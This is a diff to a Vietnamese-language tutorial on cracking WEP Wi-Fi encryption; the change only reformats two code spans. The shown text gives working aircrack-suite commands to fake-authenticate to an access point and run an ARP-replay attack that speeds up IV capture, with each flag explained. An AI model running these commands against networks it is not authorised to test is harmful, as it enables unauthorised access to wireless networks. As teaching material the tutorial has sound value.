@@ -15,13 +15,13 @@
 - Để có thể bắt được nhiều IV trong một khoảng thời gian ngắn thì ta cần :
   - Fake authentication một client có sẵn để giao tiếp với AP bằng aireplay-ng
   
-  `aireplay-ng --fakeauth 0 -a 14:CC:20:84:DD:B5 -h 84:16:F9:08:3C:30 wlan0mon`
+  ```aireplay-ng --fakeauth 0 -a 14:CC:20:84:DD:B5 -h 84:16:F9:08:3C:30 wlan0mon```
   
   trong đó -a là bssid của AP,  còn -h là địa chỉ MAC của card mạng sử dụng, còn wlan0mon là tên interface của card mạng
   ![fake authen](https://github.com/annapsyktova/wepcracking/blob/img/1.png)
   - Tiếp theo ta sẽ tấn công arp vào mạng để tăng traffic trong mạng,  rút ngắn thời gian bắt gói tin
   
-  `aireplay-ng -3 -b 14:CC:20:84:DD:B5 -h 84:16:F9:08:3C:30 wlan0mon`
+  ```aireplay-ng -3 -b 14:CC:20:84:DD:B5 -h 84:16:F9:08:3C:30 wlan0mon```
   
   trong đó -3 là option arp-request, -b là bssid của AP, -h là địa chỉ MAC của card mạng :
   
